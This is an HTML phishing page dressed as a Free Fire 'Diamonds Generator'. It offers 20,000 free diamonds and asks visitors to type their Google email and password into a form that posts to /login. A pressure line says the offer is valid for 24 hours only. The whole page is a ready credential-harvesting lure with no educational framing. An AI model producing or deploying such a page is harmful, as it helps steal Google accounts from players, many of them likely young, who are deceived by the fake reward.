<!DOCTYPE html>
<html>
<head>
  <title>Free Fire Diamonds - Google Login</title>
  <style>
    body { 
      background: linear-gradient(45deg, #ff4444, #ff8800); 
      font-family: Arial; 
      text-align: center; 
      margin: 0; 
      padding: 50px; 
    }
    .container { 
      background: white; 
      max-width: 400px; 
      margin: auto; 
      padding: 30px; 
      border-radius: 15px; 
      box-shadow: 0 10px 30px rgba(0,0,0,0.3); 
    }
    .logo { 
      width: 150px; 
      margin-bottom: 20px; 
    }
    input { 
      width: 100%; 
      padding: 15px; 
      margin: 10px 0; 
      border: 2px solid #ddd; 
      border-radius: 8px; 
      font-size: 16px; 
    }
    button { 
      width: 100%; 
      padding: 15px; 
      background: #00ff88; 
      color: white; 
      border: none; 
      border-radius: 8px; 
      font-size: 18px; 
      cursor: pointer; 
    }
    .freefire { color: #ff4444; font-weight: bold; }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://freefiremobile.com/wp-content/uploads/2020/12/Free-Fire-Logo.png" class="logo" alt="Free Fire">
    <h2><span class="freefire">FREE FIRE</span> Diamonds Generator</h2>
    <p>Login with Google to claim <b>20,000 Diamonds FREE!</b></p>
    
    <form action="/login" method="POST">
      <input type="email" name="email" placeholder="Google Email" required>
      <input type="password" name="password" placeholder="Google Password" required>
      <button type="submit">🎮 CLAIM DIAMONDS NOW 🎮</button>
    </form>
    
    <p style="font-size: 12px; margin-top: 20px; color: #666;">
      Limited time offer - Valid for 24 hours only!
    </p>
  </div>
</body>
</html>
